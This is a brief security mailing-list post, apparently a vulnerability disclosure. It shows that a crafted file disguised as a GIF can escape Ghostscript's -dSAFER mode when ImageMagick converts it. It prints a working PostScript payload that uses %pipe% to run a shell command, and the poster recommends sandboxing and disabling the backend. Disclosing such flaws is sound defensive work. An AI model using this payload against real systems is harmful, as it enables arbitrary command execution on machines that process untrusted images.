This also works in and higher, arbitrary shell command execution:  $ cat test.gif currentdevice null true mark /OutputICCProfile (%pipe%id > /dev/tty) .putdeviceparams quit $ convert test.gif png:test.png  (Note: I don't know why it doesn't work on earlier versions, maybe it's possible to make it work, or some other param will work)  I think -dSAFER is too dangerous to use without sandboxing right now, things like evince and imagemagick that use it as a backend should disable by default.  I'm not planning to look any more at this.  Tavis.  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
